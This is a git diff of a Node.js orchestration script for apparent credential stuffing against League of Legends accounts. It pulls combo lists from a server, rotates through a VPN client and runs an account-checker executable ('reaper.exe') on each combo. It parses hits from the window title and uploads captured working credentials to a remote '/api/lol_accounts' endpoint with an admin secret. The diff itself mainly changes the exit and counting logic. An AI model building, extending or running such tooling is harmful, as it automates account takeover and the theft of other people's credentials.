@@ -6,6 +6,7 @@ const fs = require('fs');
 
 const { run } = require('./utils/scripts');
 const { wait } = require('./utils/wait');
+const { finish } = require('./utils/finish');
 const { getStatiscs } = require('./utils/statiscs');
 const projectDir = require('./utils/projectDir');
 
@@ -32,11 +33,13 @@ const main = async () => {
       let [, combos] = response.data.split('\n\n');
       combos = (combos || response.data || '').split('\n').filter(c => c);
       console.log(`Combos:\n${combos}`);
-	  run(`"${projectDir}/src/vpn_client/hsscp.exe"`);
-	  await wait(11000);
+      run(`"${projectDir}/src/vpn_client/hsscp.exe"`);
+      await wait(11000);
 
-      let finished = false;
-      for (const combo of combos) {
+      let finishCount = 0;
+      const finished = () => finishCount >= combos.length - 1;
+      for (let i = 0; i < combos.length; i += 1) {
+        const combo = combos[i];
         fs.writeFileSync(`${projectDir}/src/reaper/combos.txt`, combo);
         run(`cd ${projectDir}/src/reaper && reaper.exe`);
         await wait(4000);
@@ -48,7 +51,7 @@ const main = async () => {
         console.log('Window Title: ', winTitle);
         const { total, hits, bad, retry, usernames } = getStatiscs(winTitle, combos);
         console.log(`Total: ${total}, Hits: ${hits}, Bad: ${bad}, Retry: ${retry}, User Names: ${usernames}`);
-        if (total === bad)
+        if (total === bad) {
           axios
             .put(`${url}/api/lol_accounts/ignore/${region}`, combo, {
               headers: { admin_secret_production: secret, 'Content-Type': 'text/plain' }
@@ -57,7 +60,15 @@ const main = async () => {
               console.log('Update Status', rPut.status);
               console.log('Update Data', JSON.stringify(rPut.data, null, 2).blue);
             })
-            .catch(console.error);
+            .catch(error => {
+              console.error(error);
+            })
+            .finally(() => {
+              finishCount += 1;
+              if (finished()) finish(0);
+            });
+          break;
+        }
 
         const result = fs.readFileSync(`${projectDir}/src/reaper/hits/Capture.txt`).toString();
         console.log(`Updating if not empty with: \`${result}\``);
@@ -67,18 +78,18 @@ const main = async () => {
             .then(rPut => {
               console.log('Update Status', rPut.status);
               console.log('Update Data', JSON.stringify(rPut.data, null, 2).blue);
-			  if (finished) process.exit(0);
-            }).catch(error => {
-			  console.error(error);
-			  if (finished) process.exit(0);
+            })
+            .catch(console.error)
+            .finally(() => {
+              finishCount += 1;
+              if (finished()) finish(0);
             });
-		await run('taskkill /IM "._cache_reaper.exe" /F');
+        await run('taskkill /IM "._cache_reaper.exe" /F');
       }
-	  finished = true;
     })
     .catch(error => {
       console.error(error);
-      process.exit(1);
+      finish(1);
     });
 };
 
